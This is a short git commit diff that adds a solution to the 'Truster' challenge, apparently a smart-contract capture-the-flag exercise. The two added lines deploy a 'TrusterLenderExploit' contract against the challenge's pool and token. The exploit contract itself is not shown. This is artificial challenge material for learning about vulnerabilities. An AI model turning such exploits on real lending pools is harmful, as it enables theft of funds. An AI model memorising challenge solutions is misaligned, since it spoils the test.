339fbf06c1358b49e59e2d793262ffc62944900f
astrolince <astro@astrolince.com>
2022-04-20 06:14:36 -0300

    truster exploit

--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -29,6 +29,8 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const ExploitFactory = await ethers.getContractFactory("TrusterLenderExploit");
+        this.attacker = await ExploitFactory.deploy(this.pool.address, this.token.address, attacker.address);
     });
 
     after(async function () {
